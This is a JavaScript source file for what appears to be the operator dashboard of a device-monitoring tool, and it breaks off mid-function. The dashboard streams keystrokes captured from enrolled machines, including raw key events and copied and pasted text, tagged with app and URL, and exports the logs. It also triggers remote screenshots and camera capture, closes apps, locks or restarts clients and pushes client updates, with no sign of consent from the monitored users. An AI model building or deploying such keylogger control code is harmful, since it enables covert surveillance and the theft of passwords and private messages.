import { fetchJson, postJson } from './parts/api.js';
import { formatAge, formatTime, formatUptime } from './parts/formatters.js';

const feed = document.getElementById('feed');
  const liveNotificationEl = document.getElementById('liveNotification');
  const liveNotificationTextEl = document.getElementById('liveNotificationText');
  const closeNotificationEl = document.getElementById('closeNotification');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const onlineCountEl = document.getElementById('onlineCount');
    const deviceUpdatedEl = document.getElementById('deviceUpdated');
    const deviceListEl = document.getElementById('deviceList');
    const openAppsDeviceEl = document.getElementById('openAppsDevice');
    const openAppsListEl = document.getElementById('openAppsList');
    const closeAllAppsButtonEl = document.getElementById('closeAllAppsButton');
    const supportLinkEl = document.getElementById('supportLink');
    const paymentListEl = document.getElementById('paymentList');
    const openMonitoredSitesButtonEl = document.getElementById('openMonitoredSitesButton');
    const openMonitoredAppsButtonEl = document.getElementById('openMonitoredAppsButton');
    const monitoredSitesDialogEl = document.getElementById('monitoredSitesDialog');
    const monitoredAppsDialogEl = document.getElementById('monitoredAppsDialog');
    const monitoredSitesInputEl = document.getElementById('monitoredSitesInput');
    const monitoredAppsInputEl = document.getElementById('monitoredAppsInput');
    const saveMonitoredSitesButtonEl = document.getElementById('saveMonitoredSitesButton');
    const saveMonitoredAppsButtonEl = document.getElementById('saveMonitoredAppsButton');
    const monitoredSitesStatusEl = document.getElementById('monitoredSitesStatus');
    const monitoredAppsStatusEl = document.getElementById('monitoredAppsStatus');
    const closeMonitoredSitesDialogButtonEl = document.getElementById('closeMonitoredSitesDialogButton');
    const closeMonitoredAppsDialogButtonEl = document.getElementById('closeMonitoredAppsDialogButton');
    const cancelMonitoredSitesButtonEl = document.getElementById('cancelMonitoredSitesButton');
    const cancelMonitoredAppsButtonEl = document.getElementById('cancelMonitoredAppsButton');
    const scopeLabelEl = document.getElementById('scopeLabel');
    const messageSearchEl = document.getElementById('messageSearch');
    const rawHistoryControlsEl = document.getElementById('rawHistoryControls');
    const rawDeviceFilterEl = document.getElementById('rawDeviceFilter');
    const rawSessionFilterEl = document.getElementById('rawSessionFilter');
    const rawStartFilterEl = document.getElementById('rawStartFilter');
    const rawEndFilterEl = document.getElementById('rawEndFilter');
    const controlsPanelEl = document.getElementById('controlsPanel');
    const controlsDeviceEl = document.getElementById('controlsDevice');
    const captureScreenshotButtonEl = document.getElementById('captureScreenshotButton');
    const screenshotOverlayEl = document.getElementById('screenshotOverlay');
    const screenshotDialogEl = document.getElementById('screenshotOverlay');
    const screenshotDialogTargetEl = document.getElementById('screenshotDialogTarget');
    const screenshotDialogProgressEl = document.getElementById('screenshotDialogProgress');
    const screenshotDialogStatusEl = document.getElementById('screenshotDialogStatus');
    const screenshotDialogPreviewEl = document.getElementById('screenshotDialogPreview');
    const screenshotDialogPlaceholderEl = document.getElementById('screenshotDialogPlaceholder');
    const closeScreenshotButtonEl = document.getElementById('closeScreenshotButton');
    const cancelScreenshotButtonEl = document.getElementById('cancelScreenshotButton');
    const confirmScreenshotButtonEl = document.getElementById('confirmScreenshotButton');
    const activityPanelEl = document.getElementById('activityPanel');
    const activityDialogEl = document.getElementById('activityDialog');
    const closeActivityButtonEl = document.getElementById('closeActivityButton');
    const closeActivityDialogButtonEl = document.getElementById('closeActivityDialogButton');
    const controlsStatusEl = document.getElementById('controlsStatus');
    const commandHistoryEl = document.getElementById('commandHistory');
    const activityStatsEl = document.getElementById('activityStats');
    const activityDialogStatsEl = document.getElementById('activityDialogStats');
    const topAppsEl = document.getElementById('topApps');
    const topDomainsEl = document.getElementById('topDomains');
    const topAppsDialogEl = document.getElementById('topAppsDialog');
    const topDomainsDialogEl = document.getElementById('topDomainsDialog');
    const deviceDetailEl = document.getElementById('deviceDetail');
    const deviceDetailDialogEl = document.getElementById('deviceDetailDialog');
    const exportCsvLinkEl = document.getElementById('exportCsvLink');
    const exportJsonLinkEl = document.getElementById('exportJsonLink');
    const exportCsvLinkDialogEl = document.getElementById('exportCsvLinkDialog');
    const exportJsonLinkDialogEl = document.getElementById('exportJsonLinkDialog');
    const shutdownButtonEl = document.getElementById('shutdownButton');
    const logoutClientButtonEl = document.getElementById('logoutClientButton');
    const restartClientButtonEl = document.getElementById('restartClientButton');
    const lockClientButtonEl = document.getElementById('lockClientButton');
    const pauseClientButtonEl = document.getElementById('pauseClientButton');
    const resumeClientButtonEl = document.getElementById('resumeClientButton');
    const disableCameraButtonEl = document.getElementById('disableCameraButton');
    const openUltraViewerButtonEl = document.getElementById('openUltraViewerButton');
    const updateClientButtonEl = document.getElementById('updateClientButton');
    const logoutDashboardButtonEl = document.getElementById('logoutDashboardButton');
    const activityButtonEl = document.getElementById('activityButton');
    const cameraDialogEl = document.getElementById('cameraDialog');
    const cameraFormEl = document.getElementById('cameraForm');
    const cameraDialogTargetEl = document.getElementById('cameraDialogTarget');
    const cameraDurationEl = document.getElementById('cameraDuration');
    const closeCameraButtonEl = document.getElementById('closeCameraButton');
    const cancelCameraButtonEl = document.getElementById('cancelCameraButton');
    const confirmCameraButtonEl = document.getElementById('confirmCameraButton');
    const refreshButtonEl = document.getElementById('refreshButton');
    const openMessageButtonEl = document.getElementById('openMessageButton');
    const todayHistoryButtonEl = document.getElementById('todayHistoryButton');
    const visitedLinksButtonEl = document.getElementById('visitedLinksButton');
    const messageDialogEl = document.getElementById('messageDialog');
    const closeMessageButtonEl = document.getElementById('closeMessageButton');
    const cancelMessageButtonEl = document.getElementById('cancelMessageButton');
    const messageDialogTargetEl = document.getElementById('messageDialogTarget');
    const messageLengthEl = document.getElementById('messageLength');
    const messageComposeEl = document.getElementById('messageCompose');
    const clientMessageEl = document.getElementById('clientMessage');
    const clientImageEl = document.getElementById('clientImage');
    const clientImageNameEl = document.getElementById('clientImageName');
    const sendMessageButtonEl = document.getElementById('sendMessageButton');
    const historyDialogEl = document.getElementById('historyDialog');
    const closeHistoryButtonEl = document.getElementById('closeHistoryButton');
    const closeHistoryDialogButtonEl = document.getElementById('closeHistoryDialogButton');
    const todayHistoryTargetEl = document.getElementById('todayHistoryTarget');
    const todayHistoryListEl = document.getElementById('todayHistoryList');
    const visitedLinksDialogEl = document.getElementById('visitedLinksDialog');
    const closeVisitedLinksButtonEl = document.getElementById('closeVisitedLinksButton');
    const closeVisitedLinksDialogButtonEl = document.getElementById('closeVisitedLinksDialogButton');
    const visitedLinksTargetEl = document.getElementById('visitedLinksTarget');
    const visitedLinksListEl = document.getElementById('visitedLinksList');
    const deviceUptimes = new Map();
    const deviceOnlineStates = new Map();
    const deviceClocks = new Map();
    let latestDevices = [];
    let selectedDeviceId = new URLSearchParams(window.location.search).get('device') || '';
    let displayMode = 'filtered';
    let currentMessages = [];
    let eventSource = null;
    let serviceStartedAt = null;
    let serviceUptime = 0;
    let renderQueued = false;
    let rawHistory = [];
    let lastDeviceSignature = '';
    let panelRequestId = 0;
    let screenshotSignature = null;
    let notificationTimer = null;
    let screenshotStatusTimer = null;

    function showLiveNotification(msg) {
      const preview = String(msg.text || msg.raw_text || '').trim();
      const source = msg.app_name ? ` in ${msg.app_name}` : '';
      liveNotificationTextEl.textContent = `${preview || 'New activity received'}${source}`;
      liveNotificationEl.hidden = false;
      if (notificationTimer) clearTimeout(notificationTimer);
      notificationTimer = setTimeout(() => {
        liveNotificationEl.hidden = true;
      }, 5000);
    }

    closeNotificationEl.addEventListener('click', () => {
      liveNotificationEl.hidden = true;
      if (notificationTimer) clearTimeout(notificationTimer);
    });

    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    function updateDeviceUptimes() {
      document.querySelectorAll('.device-uptime').forEach((uptimeEl) => {
        const deviceId = uptimeEl.dataset.deviceId;
        let seconds = deviceUptimes.get(deviceId);
        if (seconds === undefined) return;
        if (deviceOnlineStates.get(deviceId)) {
          seconds += 1;
          deviceUptimes.set(deviceId, seconds);
        }
        uptimeEl.textContent = `Uptime: ${formatUptime(seconds)}`;
      });
      document.querySelectorAll('.device-local-time').forEach((timeEl) => {
        const deviceId = timeEl.dataset.deviceId;
        const clock = deviceClocks.get(deviceId);
        if (!clock) return;
        const elapsed = Date.now() - clock.receivedAt;
        timeEl.textContent = `Device time ${new Date(clock.timeMs + elapsed).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`;
      });
    }

    function renderOpenApps(devices) {
      const device = devices.find((item) => String(item.id) === selectedDeviceId);
      openAppsListEl.innerHTML = '';
      if (!device) {
        openAppsDeviceEl.textContent = 'Select a device';
        const item = document.createElement('li');
        item.textContent = 'Select a device to view open apps';
        openAppsListEl.appendChild(item);
        closeAllAppsButtonEl.disabled = true;
        return;
      }
      openAppsDeviceEl.textContent = `${device.name || 'Unknown device'} Â· ${device.id}`;
      closeAllAppsButtonEl.disabled = !device.online;
      const apps = Array.isArray(device.open_apps) ? device.open_apps : [];
      if (!apps.length) {
        const item = document.createElement('li');
        item.textContent = device.online
          ? 'No app telemetry yet. Install the updated client.'
          : 'Device offline';
        openAppsListEl.appendChild(item);
        return;
      }
      apps.forEach((app) => {
        const item = document.createElement('li');
        item.className = 'open-app-item';

        const appLabel = document.createElement('span');
        appLabel.className = 'open-app-label';
        appLabel.textContent = app;

        const closeButton = document.createElement('button');
        closeButton.type = 'button';
        closeButton.className = 'control-button control-button-warning';
        closeButton.textContent = 'Close';
        closeButton.addEventListener('click', async () => {
          if (!selectedDeviceId) return;
          closeButton.disabled = true;
          closeButton.textContent = 'Closing...';
          try {
            await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
              command: 'close_app',
              message: String(app),
            });
            controlsStatusEl.textContent = `Close request sent for ${app}.`;
          } catch (err) {
            controlsStatusEl.textContent = `Could not close ${app}.`;
          } finally {
            closeButton.disabled = false;
            closeButton.textContent = 'Close';
          }
        });

        item.append(appLabel, closeButton);
        openAppsListEl.appendChild(item);
      });
    }

    closeAllAppsButtonEl.addEventListener('click', async () => {
      if (!selectedDeviceId) {
        controlsStatusEl.textContent = 'Select a device first.';
        return;
      }
      closeAllAppsButtonEl.disabled = true;
      controlsStatusEl.textContent = 'Closing all visible windows...';
      try {
        await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
          command: 'close_all_apps',
          message: '',
        });
        controlsStatusEl.textContent = 'Close-all request sent.';
      } catch (err) {
        controlsStatusEl.textContent = 'Close-all request failed.';
      } finally {
        closeAllAppsButtonEl.disabled = false;
      }
    });

    function renderPaymentMethods(paymentMethods) {
      paymentListEl.innerHTML = '';
      paymentMethods
        .filter((method) => method.value)
        .forEach((method) => {
          const item = document.createElement('div');
          item.className = 'payment-item';

          const details = document.createElement('div');
          details.className = 'payment-details';
          const name = document.createElement('span');
          name.className = 'payment-name';
          name.textContent = method.name;
          const value = document.createElement('span');
          value.className = 'payment-value';
          value.textContent = method.value;
          details.append(name, value);

          const copyButton = document.createElement('button');
          copyButton.className = 'copy-payment';
          copyButton.type = 'button';
          copyButton.textContent = 'Copy';
          copyButton.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(method.value);
              copyButton.textContent = 'Copied';
              setTimeout(() => { copyButton.textContent = 'Copy'; }, 1400);
            } catch (err) {
              copyButton.textContent = 'Select';
            }
          });

          const autofillButton = document.createElement('button');
          autofillButton.className = 'copy-payment';
          autofillButton.type = 'button';
          autofillButton.textContent = 'Autofill';
          autofillButton.addEventListener('click', async () => {
            if (!selectedDeviceId) {
              autofillButton.textContent = 'Select device';
              setTimeout(() => { autofillButton.textContent = 'Autofill'; }, 1400);
              return;
            }
            autofillButton.disabled = true;
            try {
              await postJson(`/api/devices/${encodeURIComponent(selectedDeviceId)}/command`, {
                command: 'autofill',
                message: method.value,
              });
              autofillButton.textContent = 'Filled';
            } catch (err) {
              autofillButton.textContent = 'Failed';
            } finally {
              setTimeout(() => {
                autofillButton.disabled = false;
                autofillButton.textContent = 'Autofill';
              }, 1400);
            }
          });

          const actions = document.createElement('div');
          actions.className = 'payment-actions';
          actions.append(copyButton, autofillButton);
          item.append(details, actions);
          paymentListEl.appendChild(item);
        });
    }

    async function loadConfig() {
      try {
        const config = await fetchJson('/api/config');
        if (config.buy_me_a_coffee_url) supportLinkEl.href = config.buy_me_a_coffee_url;
        renderPaymentMethods(config.payment_methods || []);
        if (!config.buy_me_a_coffee_url && config.payment_methods?.length) {
          supportLinkEl.textContent = 'Support options';
          supportLinkEl.removeAttribute('href');
        }
        const monitoredSites = Array.isArray(config.monitored_sites) ? config.monitored_sites : [];
        const monitoredApps = Array.isArray(config.monitored_apps) ? config.monitored_apps : [];
        monitoredSitesInputEl.value = monitoredSites.join('\n');
        monitoredAppsInputEl.value = monitoredApps.join('\n');
        monitoredSitesStatusEl.textContent = monitoredSites.length ? `Monitoring ${monitoredSites.length} site(s).` : 'No sites configured yet.';
        monitoredAppsStatusEl.textContent = monitoredApps.length ? `Monitoring ${monitoredApps.length} app keyword(s).` : 'No app filters configured yet.';
      } catch (err) {
        monitoredSitesStatusEl.textContent = 'Could not load site config.';
        monitoredAppsStatusEl.textContent = 'Could not load app config.';
        // Keep the editable placeholder link when optional config is unavailable.
      }
    }

    async function saveMonitoredSites() {
      const rawInput = monitoredSitesInputEl.value || '';
      const sites = rawInput
        .split(/[\n,]+/)
        .map((entry) => entry.trim())
        .filter(Boolean);

      monitoredSitesStatusEl.textContent = 'Saving site list...';
      try {
        const result = await postJson('/api/config/monitored-sites', { sites });
        const savedSites = Array.isArray(result.sites) ? result.sites : [];
        monitoredSitesInputEl.value = savedSites.join('\n');
        monitoredSitesStatusEl.textContent = savedSites.length ? `Saved ${savedSites.length} site(s).` : 'No sites configured yet.';
      } catch (err) {
        monitoredSitesStatusEl.textContent = 'Could not save site list.';
      }
    }

    async function saveMonitoredApps() {
      const rawInput = monitoredAppsInputEl.value || '';
      const apps = rawInput
        .split(/[\n,]+/)
        .map((entry) => entry.trim())
        .filter(Boolean);

      monitoredAppsStatusEl.textContent = 'Saving app list...';
      try {
        const result = await postJson('/api/config/monitored-apps', { apps });
        const savedApps = Array.isArray(result.apps) ? result.apps : [];
        monitoredAppsInputEl.value = savedApps.join('\n');
        monitoredAppsStatusEl.textContent = savedApps.length ? `Saved ${savedApps.length} app keyword(s).` : 'No app filters configured yet.';
      } catch (err) {
        monitoredAppsStatusEl.textContent = 'Could not save app list.';
      }
    }

    openMonitoredSitesButtonEl.addEventListener('click', () => monitoredSitesDialogEl.showModal());
    openMonitoredAppsButtonEl.addEventListener('click', () => monitoredAppsDialogEl.showModal());
    closeMonitoredSitesDialogButtonEl.addEventListener('click', () => monitoredSitesDialogEl.close());
    closeMonitoredAppsDialogButtonEl.addEventListener('click', () => monitoredAppsDialogEl.close());
    cancelMonitoredSitesButtonEl.addEventListener('click', () => monitoredSitesDialogEl.close());
    cancelMonitoredAppsButtonEl.addEventListener('click', () => monitoredAppsDialogEl.close());
    saveMonitoredSitesButtonEl.addEventListener('click', () => {
      saveMonitoredSites();
      monitoredSitesDialogEl.close();
    });
    saveMonitoredAppsButtonEl.addEventListener('click', () => {
      saveMonitoredApps();
      monitoredAppsDialogEl.close();
    });

    function updateScreenshotProgress(progressEl, status) {
      const normalized = String(status || '').trim();
      const stageOrder = {
        Requested: 0,
        Queued: 0,
        Capturing: 1,
        'Taking screenshot': 1,
        Uploading: 2,
        Failed: -1,
        Ready: 3,
      };
      const activeIndex = stageOrder[normalized] ?? (normalized.includes('capture') ? 1 : normalized.includes('upload') ? 2 : 0);
      progressEl.querySelectorAll('.progress-step').forEach((step, index) => {
        const stageName = step.dataset.stage;
        const isActive = index === activeIndex;
        const isComplete = stageOrder[stageName] !== undefined && (stageOrder[stageName] < activeIndex || (normalized === 'Ready' && stageName === 'Ready'));
        step.classList.toggle('active', isActive);
        step.classList.toggle('done', isComplete);
      });
      if (normalized === 'Failed') {
        progressEl.querySelectorAll('.progress-step').forEach((step) => {
          step.classList.remove('active', 'done');
        });
      }
    }

    function syncScreenshotPreviewState(selectedDevice, status, message) {
      if (!selectedDevice) {
        screenshotDialogStatusEl.textContent = 'Select a device to preview screenshots.';
        screenshotDialogStatusEl.className = 'controls-screenshot-status';
        screenshotDialogPreviewEl.hidden = true;
        screenshotDialogPreviewEl.removeAttribute('src');
        screenshotDialogPlaceholderEl.hidden = false;
        return;
      }
      const previewUrl = selectedDevice.screenshot_url || '';
      const previewMessage = message || 'Ready to capture';
      const statusClass = `controls-screenshot-status ${(status || '').toLowerCase().replaceAll(' ', '-')}`;
      const isCapturing = ['Requested', 'Taking screenshot', 'Capturing', 'Uploading'].includes(status);
      screenshotDialogStatusEl.textContent = previewMessage;
      screenshotDialogStatusEl.className = statusClass;
      updateScreenshotProgress(screenshotDialogProgressEl, status);
      if (previewUrl && !isCapturing) {
        screenshotDialogPreviewEl.src = `${previewUrl}?t=${Date.now()}`;
        screenshotDialogPreviewEl.hidden = false;
        screenshotDialogPlaceholderEl.hidden = true;
      } else {
        screenshotDialogPreviewEl.hidden = true;
        screenshotDialogPreviewEl.removeAttribute('src');
        screenshotDialogPlaceholderEl.hidden = false;
      }
    }

    function updateSelectedDeviceScreenshot() {
      const selectedDevice = latestDevices.find((device) => String(device.id) === String(selectedDeviceId));
      const defaultStatus = 'Ready';
      if (!selectedDeviceId || !selectedDevice) {
        syncScreenshotPreviewState(null, 'Ready', 'Select a device to preview screenshots.');
        captureScreenshotButtonEl.disabled = true;
        return;
      }
      const status = selectedDevice.screenshot_status || defaultStatus;
      const message = selectedDevice.screenshot_message || 'Ready to capture';
      const isBusy = ['Requested', 'Taking screenshot', 'Capturing', 'Uploading'].includes(status);
      captureScreenshotButtonEl.disabled = !selectedDevice.online || isBusy;
      syncScreenshotPreviewState(selectedDevice, status, message);
    }

    async function loadDevices() {
      try {
        const devices = await fetchJson('/api/devices');
        latestDevices = devices;
        renderOpenApps(devices);
        deviceCountEl.textContent = devices.length;
        onlineCountEl.textContent = `${devices.filter((device) => device.online).length} online`;
        deviceUpdatedEl.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}`;
        updateSelectedDeviceScreenshot();
        syncUpdateButtonState();
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          deviceUptimes.set(deviceId, Number(device.uptime_seconds) || 0);
          deviceOnlineStates.set(deviceId, Boolean(device.online));
          if (Number.isFinite(Number(device.local_time_ms)) && Number(device.local_time_ms) >= 100000000000) {
            const nextTime = Number(device.local_time_ms);
            const currentClock = deviceClocks.get(deviceId);
            if (!currentClock || Math.abs(currentClock.timeMs - nextTime) > 2000) {
              deviceClocks.set(deviceId, { timeMs: nextTime, receivedAt: Date.now() });
            }
          }
        });
        const deviceSignature = JSON.stringify(devices.map((device) => ({
          id: device.id,
          name: device.name,
          client_version: device.client_version,
          client_ip: device.client_ip,
          local_ip: device.local_ip,
          online: device.online,
          status: device.status,
          open_apps: device.open_apps,
          local_time_ms: device.local_time_ms,
          logged_in_user: device.logged_in_user,
          battery_percent: device.battery_percent,
          battery_status: device.battery_status,
          screenshot_status: device.screenshot_status,
          screenshot_message: device.screenshot_message,
          website_history_status: device.website_history_status,
          website_history_message: device.website_history_message,
        })));
        if (deviceSignature === lastDeviceSignature) return;
        lastDeviceSignature = deviceSignature;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const deviceId = String(device.id || 'unknown');
          const row = document.createElement('div');
          row.className = `device-row${device.online ? ' online' : ''}${deviceId === selectedDeviceId ? ' selected' : ''}`;
          row.addEventListener('click', () => selectDevice(deviceId));

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const ip = document.createElement('span');
          ip.className = 'device-ip';
          ip.textContent = `Public IP: ${device.client_ip || device.clientIp || 'Unknown'}`;

          const localIp = document.createElement('span');
          localIp.className = 'device-ip';
          localIp.textContent = `Local IP: ${device.local_ip || 'Unknown'}`;

          const version = document.createElement('span');
          version.className = 'device-version';
          version.textContent = `Client v${device.client_version || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state ${device.online ? 'online' : 'offline'}`;
          state.textContent = device.status || (device.online ? 'Online' : 'Offline');

          const uptime = document.createElement('span');
          uptime.className = 'device-seen device-uptime';
          uptime.dataset.deviceId = deviceId;
          uptime.textContent = `Uptime: ${formatUptime(deviceUptimes.get(deviceId))}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen ${formatAge(device.last_seen_age_seconds || 0)}`
            : 'Last seen unknown';

          const joined = document.createElement('span');
          joined.className = 'device-seen';
          joined.textContent = device.joined_at
            ? `Joined ${formatTime(device.joined_at)}`
            : 'Joined date unknown';

          const localTime = document.createElement('span');
          localTime.className = 'device-seen device-local-time';
          localTime.dataset.deviceId = deviceId;
          const validDeviceTime = Number(device.local_time_ms) >= 100000000000;
          localTime.textContent = validDeviceTime
            ? `Device time ${new Date(Number(device.local_time_ms)).toLocaleString([], { dateStyle: 'medium', timeStyle: 'medium' })}`
            : device.local_time
              ? `Device time ${device.local_time}`
              : 'Device time unavailable';

          const user = document.createElement('span');
          user.className = 'device-seen';
          user.textContent = `Logged in as ${device.logged_in_user || 'Unknown user'}`;

          const battery = document.createElement('span');
          battery.className = 'device-seen';
          const batteryPercent = device.battery_percent == null ? '' : ` ${device.battery_percent}%`;
          battery.textContent = `Battery: ${device.battery_status || 'Unknown'}${batteryPercent}`;

          row.append(name, id, ip, localIp, version, state, uptime, seen, joined, localTime, user, battery);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        if (!lastDeviceSignature) deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const health = await fetchJson('/health');
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      if (displayMode === 'filtered' && msg.raw_only) return;
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      const bubbleType = msg.is_pasted ? 'pasted' : (msg.is_copied ? 'copied' : '');
      bubble.className = `bubble${bubbleType ? ` ${bubbleType}` : ''}`;
      bubble.textContent = displayMode === 'raw' ? (msg.raw_text || msg.text) : msg.text;

      if (msg.is_pasted || msg.is_copied) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = msg.is_copied ? 'Copied' : 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      if (msg.source_url) {
        const sourceLinkRow = document.createElement('div');
        sourceLinkRow.className = 'source-link-row';
        const sourceLink = document.createElement('a');
        sourceLink.className = 'source-link';
        sourceLink.href = msg.source_url;
        sourceLink.target = '_blank';
        sourceLink.rel = 'noopener noreferrer';
        sourceLink.title = msg.source_url;
        sourceLink.textContent = msg.source_url;

        const copySourceButton = document.createElement('button');
        copySourceButton.className = 'copy-source';
        copySourceButton.type = 'button';
        copySourceButton.textContent = 'Copy link';
        copySourceButton.addEventListener('click', async () => {
          try {
            await navigator.clipboard.writeText(msg.source_url);
            copySourceButton.textContent = 'Copied';
            setTimeout(() => { copySourceButton.textContent = 'Copy link'; }, 1400);
          } catch (err) {
            copySourceButton.textContent = 'Select';
          }
        });

        sourceLinkRow.append(sourceLink, copySourceButton);
        bubble.appendChild(sourceLinkRow);
      }

      wrap.appendChild(bubble);
      return wrap;
    }

    function visibleMessages() {
      const search = messageSearchEl.value.trim().toLowerCase();
      const matchesSearch = (msg) => {
        if (!search) return true;
        return [msg.text, msg.raw_text, msg.device_name, msg.device_id, msg.app_name]
          .some((value) => String(value || '').toLowerCase().includes(search));
      };
      if (displayMode === 'raw') {
        const rawMessages = currentMessages.filter((msg) => msg.raw_only && matchesSearch(msg));
        return rawMessages.length ? rawMessages : currentMessages.filter(matchesSearch);
      }
      return currentMessages.filter((msg) => !msg.raw_only && matchesSearch(msg));
    }

    function updateMessageCount() {
      messageCountEl.textContent = visibleMessages().length;
    }

    function queueFeedRender() {
      if (renderQueued) return;
      renderQueued = true;
      requestAnimationFrame(() => {
        renderQueued = false;
        renderFeed();
      });
    }

    function renderFeed() {
      feed.innerHTML = '';
      if (displayMode === 'raw-history') {
        const fragment = document.createDocumentFragment();
        rawHistory.forEach((batch) => {
          const section = document.createElement('section');
          section.className = 'raw-batch';
          const heading = document.createElement('header');
          heading.className = 'raw-batch-heading';
          heading.textContent = `${formatTime(batch.started_at)} - ${formatTime(batch.ended_at)} | ${batch.device_name} | ${batch.event_count} events`;
          const session = document.createElement('span');
          session.textContent = `Session ${batch.session_id}`;
          heading.appendChild(session);
          section.appendChild(heading);
          batch.events.forEach((event) => {
            const row = document.createElement('div');
            row.className = 'raw-event';
            const time = document.createElement('time');
            time.textContent = formatTime(event.time);
            const key = document.createElement('code');
            key.textContent = event.key;
            const app = document.createElement('span');
            app.textContent = event.app_name || 'Unknown app';
            row.append(time, key, app);
            section.appendChild(row);
          });
          fragment.appendChild(section);
        });
        feed.appendChild(fragment);
        messageCountEl.textContent = rawHistory.reduce((count, batch) => count + batch.event_count, 0);
        feed.scrollTop = 0;
        return;
      }
      if (displayMode === 'raw') {
        const rawLog = document.createElement('pre');
        rawLog.className = 'raw-log';
        rawLog.textContent = visibleMessages()
          .map((msg) => msg.raw_text || msg.text)
          .join('');
        feed.appendChild(rawLog);
        updateMessageCount();
        feed.scrollTop = feed.scrollHeight;
        return;
      }
      const fragment = document.createDocumentFragment();
      visibleMessages().forEach((msg) => fragment.appendChild(addMessage(msg)));
      feed.appendChild(fragment);
      updateMessageCount();
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const messages = await fetchJson(`/messages${query}`);
        currentMessages = messages;
        renderFeed();
        statusEl.textContent = selectedDeviceId ? 'Device filtered keys: ' + visibleMessages().length : 'Latest filtered keys: ' + visibleMessages().length;
        return true;
      } catch (err) {
        statusEl.textContent = 'Listening for filtered keysâ€¦';
        return false;
      }
    }

    async function loadRawHistory() {
      const requestId = ++panelRequestId;
      showFeedLoader('Loading local saved events');
      const params = new URLSearchParams();
      const deviceId = rawDeviceFilterEl.value.trim() || selectedDeviceId;
      if (deviceId) params.set('device_id', deviceId);
      if (rawSessionFilterEl.value.trim()) params.set('session_id', rawSessionFilterEl.value.trim());
      if (rawStartFilterEl.value) params.set('start_time', String(new Date(rawStartFilterEl.value).getTime()));
      if (rawEndFilterEl.value) params.set('end_time', String(new Date(rawEndFilterEl.value).getTime()));
      params.set('limit', '100');
      try {
        rawHistory = await fetchJson(`/api/raw-history?${params}`);
        if (requestId !== panelRequestId) return;
        renderFeed();
        statusEl.textContent = `Local saved: ${rawHistory.length} batches`;
      } catch (err) {
        rawHistory = [];
        renderFeed();
        statusEl.textContent = 'Local saved events unavailable';
      }
    }

    async function loadScreenshots() {
      const requestId = ++panelRequestId;
      try {
        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
        const screenshots = await fetchJson(`/api/screenshots${query}`);
        if (requestId !== panelRequestId) return;
        const nextSignature = screenshots.map((item) => item.id).join(',');
        if (nextSignature === screenshotSignature) return;
        screenshotSignature = nextSignature;
        feed.innerHTML = '';
        if (!screenshots.length) {
          feed.innerHTML = '<span class="device-seen">No screenshots saved</span>';
        } else {
          const grid = document.createElement('div');
          grid.className = 'screenshot-grid';
          screenshots.forEach((item) => {
            const card = document.createElement('article');
            card.className = 'screenshot-card';
            const image = document.createElement('img');
            image.src = item.image_url;
            image.alt = `Screenshot from ${item.device_name}`;
            image.loading = 'lazy';
            image.addEventListener('load', () => image.classList.add('loaded'));
            image.addEventListener('error', () => {
              image.classList.add('loaded');
              image.alt = 'Screenshot unavailable - check Render logs and storage configuration';
            });
            image.addEventListener('click', () => window.open(item.image_url, '_blank', 'noopener'));
            const device = document.createElement('strong');
            device.textContent = `${item.device_name} (${item.device_id})`;
            const time = document.createElement('span');
            time.textContent = formatTime(item.captured_at);
            card.append(image, device, time);
            grid.appendChild(card);
          });
          feed.appendChild(grid);
        }
        messageCountEl.textContent = screenshots.length;
        statusEl.textContent = `Screenshots: ${screenshots.length}`;
      } catch (err) {
        feed.innerHTML = '<span class="device-seen">Screenshots unavailable</span>';
        statusEl.textContent = 'Screenshots unavailable';
      }
    }

    function showFeedLoader(label) {
      feed.innerHTML = '';
      const loader = document.createElement('div');
      loader.className = 'feed-loader';
      loader.textContent = label;
      feed.appendChild(loader);
    }

    function connectEvents() {
      const params = new URLSearchParams();
      if (selectedDeviceId) params.set('device_id', selectedDeviceId);
      const lastMessageId = currentMessages.reduce((latest, msg) => Math.max(latest, Number(msg.id) || 0), 0);
      if (lastMessageId) params.set('since', String(lastMessageId));
      const query = params.toString() ? `?${params.toString()}` : '';
